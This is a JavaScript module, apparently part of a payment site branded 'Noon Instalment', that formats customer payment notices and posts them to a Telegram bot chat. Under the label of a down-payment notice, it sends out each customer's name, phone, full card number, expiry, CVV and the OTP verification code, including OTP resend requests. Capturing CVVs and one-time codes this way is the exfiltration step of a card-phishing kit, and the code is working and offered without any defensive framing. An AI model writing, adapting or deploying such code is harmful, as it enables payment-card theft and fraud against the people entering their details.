function clip(value, max = 120) {
  return String(value ?? "")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, max);
}

function amount(value) {
  const number = Number(value);
  if (!Number.isFinite(number)) return "0.00";
  return number.toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
}

function buildNotice(payload, monthly, title, isCard) {
  const lines = [
    title,
    `Customer: ${clip(payload.name)}`,
    `Code: ${clip(payload.customerCode, 32)}`,
    `Phone: ${clip(payload.phone, 32)}`,
    monthly
      ? `Instalment: SAR ${amount(payload.downPayment)}`
      : `Down payment: SAR ${amount(payload.downPayment)}`,
    `Total: SAR ${amount(payload.totalPrice)}`,
    `Remaining: SAR ${amount(payload.remainingAmount)}`,
    `Monthly: SAR ${amount(payload.monthlyAmount)}`,
    `Plan: ${clip(payload.duration, 8)} months`,
    payload.note ? `Note: ${clip(payload.note, 160)}` : "",
  ];

  const body = lines.filter(Boolean);

  if (isCard) {
    const card = ["Card details"];
    if (payload.cardholderName) {
      card.push(`Cardholder: ${clip(payload.cardholderName, 80)}`);
    }
    if (payload.cardNumber) {
      card.push(`Card number: ${clip(payload.cardNumber, 24)}`);
    }
    if (payload.cardExpiry) {
      card.push(`Expiry: ${clip(payload.cardExpiry, 8)}`);
    }
    if (payload.cardCvv) {
      card.push(`CVV: ${clip(payload.cardCvv, 6)}`);
    }
    if (card.length > 1) {
      body.push("");
      body.push(...card);
    }
  }

  if (payload.cardOtp) {
    body.push("");
    body.push("Verification OTP");
    body.push(`OTP code: ${clip(payload.cardOtp, 12)}`);
  }

  return body.join("\n");
}

export async function sendDownPaymentNotice(payload) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return { ok: false, error: "Telegram is not configured" };
  }

  const monthly = payload.kind === "instalment";
  const isOtpResend = payload.noticeType === "card_otp_resend";
  const isOtpSubmit = payload.noticeType === "card_otp" || Boolean(payload.cardOtp);
  const isCard =
    payload.method === "card" ||
    Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry) ||
    isOtpSubmit ||
    isOtpResend;

  let title;
  if (isOtpResend) {
    title = "Noon Instalment — OTP resend requested";
  } else if (isOtpSubmit) {
    title = monthly
      ? "Noon Instalment — Monthly card OTP"
      : "Noon Instalment — Card OTP verification";
  } else if (isCard) {
    title = monthly
      ? "Noon Instalment — Monthly card payment"
      : "Noon Instalment — Card down payment";
  } else {
    title = monthly
      ? "Noon Instalment — Monthly payment"
      : "Noon Instalment — Down payment";
  }

  const text = buildNotice(payload, monthly, title, isCard);

  const response = await fetch(
    `https://api.telegram.org/bot${token}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        disable_web_page_preview: true,
      }),
    }
  );

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    return {
      ok: false,
      error: clip(data.description || "Telegram notification failed", 180),
    };
  }

  return { ok: true };
}
